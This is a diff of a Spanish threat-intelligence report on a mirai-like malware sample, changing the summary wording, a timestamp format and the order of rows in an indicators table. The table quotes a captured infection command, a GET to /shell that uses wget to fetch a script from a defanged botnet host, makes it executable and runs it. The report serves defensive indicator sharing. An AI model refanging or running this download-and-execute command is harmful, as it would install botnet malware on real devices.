@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atr
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:40:04+00:00`
+- **Registrado:** `2026-08-09T19:40:04.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -54,10 +55,10 @@ GET /shell?cd+/tmp;rm+-rf+kla.sh;wget+hxxp://aibotnet[.]su/bins/kla.sh;chmod+777
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.175.XXX | static_analysis |
 | url | hxxp://aibotnet[.]su/bins/kla.sh;chmod+777+kla.sh;./kla.sh | strings |
-| hash | 52a5a11eb588b4172e5ee9b1265e89641db42bc1065e0c9e08cc4ab6ae366e4a | static_analysis |
+| ip | 190.179.175.XXX | static_analysis |
 | command | GET /shell?cd+/tmp;rm+-rf+kla.sh;wget+hxxp://aibotnet[.]su/bins/kla.sh;chmod+777+kla.sh;./kla.sh HTTP/1.1 | strings |
+| hash | 52a5a11eb588b4172e5ee9b1265e89641db42bc1065e0c9e08cc4ab6ae366e4a | static_analysis |
 | ip | 132.243.194.XXX | artifact_source |
 
 ## 🛡️ Nota de publicación
